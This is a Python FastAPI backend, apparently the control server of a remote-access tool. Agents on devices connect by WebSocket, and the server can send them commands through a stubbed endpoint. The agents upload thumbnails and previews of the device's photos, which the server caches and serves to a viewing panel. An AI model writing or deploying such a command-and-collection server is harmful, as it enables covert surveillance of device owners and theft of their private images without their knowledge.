import json
import base64
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict
from fastapi.responses import Response, JSONResponse

# --- INICIALIZACIÓN DE LA APLICACIÓN ---
app = FastAPI(title="Agente Control Backend vFINAL")

app.add_middleware(
    CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
)

# --- "BASE DE DATOS" EN MEMORIA ---
connected_agents: Dict[str, dict] = {}
# Ahora la caché es un dict de dicts para buscar por nombre de archivo
device_media_cache: Dict[str, Dict[str, dict]] = {} 

# --- MODELOS DE DATOS MODIFICADOS ---
class Command(BaseModel):
    target_id: str
    action: str
    payload: str

class Thumbnail(BaseModel):
    filename: str
    small_thumb_b64: str # Campo para la miniatura pequeña
    large_thumb_b64: str # Campo para la vista previa grande

# --- ENDPOINTS (RUTAS DE LA API) ---

@app.websocket("/ws/{device_id}/{device_name:path}")
async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
    await websocket.accept()
    print(f"[CONEXIÓN] Agente conectado: '{device_name}' (ID: {device_id})")
    connected_agents[device_id] = {"ws": websocket, "name": device_name}
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        name_to_print = connected_agents.get(device_id, {}).get("name", f"ID: {device_id}")
        print(f"[DESCONEXIÓN] Agente desconectado: '{name_to_print}'")
        if device_id in connected_agents: del connected_agents[device_id]
        if device_id in device_media_cache: del device_media_cache[device_id]

@app.get("/api/get-agents")
async def get_agents():
    return [{"id": device_id, "name": data["name"]} for device_id, data in connected_agents.items()]

@app.post("/api/send-command")
async def send_command_to_agent(command: Command):
    # ... (Esta función no necesita cambios)
    pass

@app.post("/api/submit_media_list/{device_id}")
async def submit_media_list(device_id: str, thumbnails: List[Thumbnail]):
    if device_id not in connected_agents:
        return {"status": "error"}
    # --- LÓGICA DE CACHÉ MEJORADA ---
    # Guardamos en un diccionario para búsquedas rápidas por nombre de archivo
    device_media_cache[device_id] = {thumb.filename: thumb.dict() for thumb in thumbnails}
    print(f"Recibidas y cacheadas {len(thumbnails)} miniaturas del agente {device_id[:8]}")
    return {"status": "success"}

@app.get("/api/get_media_list/{device_id}")
async def get_media_list(device_id: str):
    # --- LÓGICA DE RESPUESTA MEJORADA ---
    # Devolvemos solo la lista de miniaturas PEQUEÑAS para el panel
    cache = device_media_cache.get(device_id, {})
    return [{"filename": data["filename"], "small_thumb_b64": data["small_thumb_b64"]} for data in cache.values()]

# --- ¡NUEVA RUTA PARA VER EN EL NAVEGADOR! ---
@app.get("/media/{device_id}/{filename:path}")
async def get_large_media(device_id: str, filename: str):
    """
    Esta ruta busca la imagen grande en la caché y la devuelve
    directamente al navegador como una imagen.
    """
    cache = device_media_cache.get(device_id, {})
    media_item = cache.get(filename)
    
    if not media_item or 'large_thumb_b64' not in media_item:
        return JSONResponse(status_code=404, content={"message": "Archivo no encontrado en la caché"})
    
    try:
        # Decodificamos el Base64 a bytes
        image_bytes = base64.b64decode(media_item['large_thumb_b64'])
        
        # Devolvemos los bytes directamente con el tipo de contenido correcto
        # Esto le dice al navegador: "Esto es un JPEG, muéstralo como una imagen"
        return Response(content=image_bytes, media_type="image/jpeg")
    except Exception as e:
        print(f"Error al decodificar o servir imagen grande: {e}")
        return JSONResponse(status_code=500, content={"message": "Error al procesar la imagen"})
